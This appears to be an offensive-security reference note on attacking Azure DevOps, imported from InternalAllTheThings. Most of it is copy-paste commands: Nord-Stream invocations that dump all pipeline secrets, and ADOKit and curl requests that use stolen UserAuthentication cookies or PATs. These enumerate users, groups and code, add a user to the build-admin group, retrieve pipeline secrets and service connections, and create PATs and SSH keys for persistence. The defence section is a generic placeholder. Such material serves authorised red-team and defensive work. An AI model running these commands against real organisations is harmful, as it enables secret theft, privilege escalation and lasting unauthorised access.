---
title: Azure Services - Azure DevOps
type: technique
tags: [azure, cicd, cloud, exploitation, reference-import]
phase: exploitation
date_created: 2026-05-13
date_updated: 2026-07-02
sources: [InternalAllTheThings]
---

# Azure Services - Azure DevOps

## What it is

Technical reference for **Azure Services - Azure DevOps** collected from InternalAllTheThings during an internal/cloud assessment ingest.

## How it works

Azure DevOps stores pipeline secrets (service connections, variable group secrets, secure files) that CI/CD pipelines use during build and deployment; attackers with `Contribute` or higher rights on a pipeline can add malicious steps that exfiltrate these secrets at runtime. Personal Access Tokens (PATs) and `UserAuthentication` cookies provide API-level access equivalent to the issuing user's permissions and are a common credential target in browser memory or configuration files. Tools like ADOKit enumerate organizations, projects, repositories, and service connections; Nord-Stream automates secret extraction by deploying malicious pipeline definitions.

## Attack phases

- **Exploitation**: primary phase for this note (credential and control-plane abuse)
- **Adjacent phases**: overlaps are common once credentials or lateral paths appear

## Prerequisites

Authorized scope covering the depicted systems; valid credentials or network reach as required by each command block inside the methodology body.

## Methodology

The following imported sections retain upstream ordering, tables, and copy-pasta blocks from InternalAllTheThings.

* [xforcered/ADOKit](https://github.com/xforcered/ADOKit) - Azure DevOps Services Attack Toolkit
* [zolderio/devops](https://github.com/zolderio/devops) - Azure DevOps Access Testing Scripts
* [synacktiv/nord-stream](https://github.com/synacktiv/nord-stream) - Nord Stream is a tool that allows you to extract secrets stored inside CI/CD environments by deploying malicious pipelines. It currently supports Azure DevOps, GitHub and GitLab.

```ps1
# List all secrets from all projects
$ nord-stream.py devops --token "$PAT" --org myorg --list-secrets

# Dump all secrets from all projects
$ nord-stream.py devops --token "$PAT" --org myorg
```

## Authentication

You can access an organization's Azure DevOps Services instance via <https://dev.azure.com/{yourorganization}>.

* Username and Password
* Authentication Cookie `UserAuthentication`: `ADOKit.exe whoami /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization`
* Personal Access Token (PAT): `ADOKit.exe whoami /credential:patToken /url:https://dev.azure.com/YourOrganization`

```ps1
PAT="XXXXXXXXXXX"
organization="YOURORGANIZATION"
curl -u :${PAT} https://dev.azure.com/${organization}/_apis/build-release/builds
```

* Access Token with FOCI (MS Authenticator)

```ps1
roadtx auth --device-code -c 4813382a-8fa7-425e-ab75-3b753aab3abb
roadtx refreshtokento -c 1950a258-227b-4e31-a9cf-717495945fc2 -r 499b84ac-1321-427f-aa17-267ca6975798/.default
python main.py --token $(jq -r '.accessToken' .roadtools_auth) repositories
```

## Recon

* Search files: `file:FileNameToSearch`, `file:Test* OR file:azure-pipelines*`

```ps1
curl -i -s -k -X $'GET'
-H $'Content-Type: application/json'
-H $'User-Agent: SOME_USER_AGENT'
-H $'Authorization: Basic BASE64ENCODEDPAT'
-H $'Host: dev.azure.com'
$'https://dev.azure.com/YOURORGANIZATION/PROJECTNAME/_apis/git/repositories/REPOSITORYID/items?recursionLevel=Full&api-version=7.0'
```

* Search code: `ADOKit.exe searchcode /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization /search:"search term"`

```ps1
curl -i -s -k -X $'POST'
-H $'Content-Type: application/json'
-H $'User-Agent: SOME_USER_AGENT'
-H $'Authorization: Basic BASE64ENCODEDPAT'
-H $'Host: almsearch.dev.azure.com'
-H $'Content-Length: 85'
-H $'Expect: 100-continue'
-H $'Connection: close'
--data-binary $'{\"searchText\": \"SEARCHTERM\", \"skipResults\":0,\"takeResults\":1000,\"isInstantSearch\":true}' 
$'https://almsearch.dev.azure.com/YOURORGANIZATION/_apis/search/codeAdvancedQueryResults?api-version=7.0-preview'
```

* Enumerate users

```ps1
curl -i -s -k -X $'GET'
-H $'Content-Type: application/json'
-H $'User-Agent: SOME_USER_AGENT'
-H $'Authorization: Basic BASE64ENCODEDPAT'
-H $'Host: dev.azure.com'
$'https://dev.azure.com/YOURORGANIZATION/_apis/graph/users?api-version=7.0'
```

* Enumerate groups: `ADOKit.exe getgroupmembers /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization /group:"search term"`

```ps1
curl -i -s -k -X $'GET'
-H $'Content-Type: application/json'
-H $'User-Agent: SOME_USER_AGENT'
-H $'Authorization: Basic BASE64ENCODEDPAT'
-H $'Host: dev.azure.com'
$'https://dev.azure.com/YOURORGANIZATION/_apis/graph/groups?api-version=7.0'
```

* Enumerate project permissions: `ADOKit.exe getpermissions /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization /project:"project name"`

* Get the user profile of the user from access_token: <https://app.vssps.visualstudio.com/_apis/profile/profiles/me?api-version=7.1>
* Get the organizations that user belongs to: <https://app.vssps.visualstudio.com/_apis/accounts?memberId={UserID}?api-version=7.1>
* Get the repositories inside of that organization: <https://dev.azure.com/{org_name}/_apis/projects?api-version=7.1>

## Privilege Escalation

* Adding User to Group: `ADOKit.exe addcollectionbuildadmin /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization /user:"username"`

```ps1
curl -i -s -k -X $'PUT'
-H $'Content-Type: application/json'
-H $'User-Agent: Some User Agent'
-H $'Authorization: Basic base64EncodedPAT'
-H $'Host: vssps.dev.azure.com'
-H $'Content-Length: 0'
$'https://vssps.dev.azure.com/YourOrganization/_apis/graph/memberships/userDescriptor/groupDescriptor?api-version=7.0-preview.1'
```

* Retrieve build variables and secrets: `ADOKit.exe getpipelinevars /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization /project:"project name"`, `ADOKit.exe getpipelinesecrets /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization /project:"project name"`

```ps1
curl -i -s -k -X $'GET'
-H $'Content-Type: application/json'
-H $'User-Agent: Some User Agent'
-H $'Authorization: Basic base64EncodedPAT'
-H $'Host: dev.azure.com'
$'https://dev.azure.com/YourOrganization/ProjectName/_apis/build/Definitions/DefinitionIDNumber?api-version=7.0'
```

* Retrieve Service Connection Information: `ADOKit.exe getserviceconnections /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization /project:"project name"`

```ps1
curl -i -s -k -X $'GET'
-H $'Content-Type: application/json;api-version=5.0-preview.1'
-H $'User-Agent: Some User Agent'
-H $'Authorization: Basic base64EncodedPAT'
-H $'Host: dev.azure.com'
$'https://dev.azure.com/YourOrganization/YourProject/_apis/serviceendpoint/endpoints?api-version=7.0'
```

## Persistence

* Create a PAT: `ADOKit.exe createpat /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization`

```ps1
curl -i -s -k -X $'POST'
-H $'Content-Type: application/json'
-H $'Accept: application/json;api-version=5.0-preview.1'
-H $'User-Agent: Some User Agent'
-H $'Host: dev.azure.com'
-H $'Content-Length: 234'
-H $'Expect: 100-continue'
-b $'X-VSS-UseRequestRouting=True; UserAuthentication=stolenCookie'
--data-binary $'{\"contributionIds\":[\"ms.vss-token-web.personal-accesstoken-issue-session-tokenprovider\"],\"dataProviderContext\":{\"properties\":{\"displayName\":\"PATName\",\"validTo\":\"YYYY-MMDDT00:00:00.000Z\",\"scope\":\"app_token\",\"targetAccounts\":[]}}}}}'
$'https://dev.azure.com/YourOrganization/_apis/Contribution/HierarchyQuery'
```

* Create SSH Keys: `ADOKit.exe createsshkey /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization /sshkey:"ssh pub key"`

```ps1
curl -i -s -k -X $'POST'
-H $'Content-Type: application/json'
-H $'Accept: application/json;api-version=5.0-preview.1'
-H $'User-Agent: Some User Agent'
-H $'Host: dev.azure.com'
-H $'Content-Length: 856'
-H $'Expect: 100-continue'
-b $'X-VSS-UseRequestRouting=True; UserAuthentication=stolenCookie'
--data-binary $'{\"contributionIds\":[\"ms.vss-token-web.personal-accesstoken-issue-session-tokenprovider\"],\"dataProviderContext\":{\"properties\":{\"displayName\":\"SSHKeyName\",\"publicData\":\"public SSH key content\",\"validTo\":\"YYYY-MMDDT00:00:00.000Z\",\"scope\":\"app_token\",\"isPublic\":true,\"targetAccounts\":[\"organizationID\"]}}}}}'
$'https://dev.azure.com/YourOrganization/_apis/Contribution/HierarchyQuery'
```

## References

* [Hiding in the Clouds: Abusing Azure DevOps Services to Bypass Microsoft Sentinel Analytic Rules - Brett Hawkins - November 6, 2023](https://www.ibm.com/downloads/cas/5JKAPVYD)
* [DevOps access is closer than you assume - rikvduijn - January 21, 2025](https://zolder.io/blog/devops-access-is-closer-than-you-assume/)
* [Training - Attacking and Defending Azure Lab - Altered Security](https://www.alteredsecurity.com/azureadlab)

## Bypasses and variants

Enumerate case-specific bypasses inside the methodologies above when upstream documented alternate paths.

## Detection and defence

Apply vendor baselines for logging, least privilege, patch cadence, and segmentation. Map signals to SOC playbooks relevant to each platform referenced in this page.

## Tools

Tool references are inline in **Methodology**; see the `tools/` pages for CLI usage.

## Sources

- Swisskyrepo [InternalAllTheThings](https://github.com/swisskyrepo/InternalAllTheThings) (ingest slug `InternalAllTheThings`).
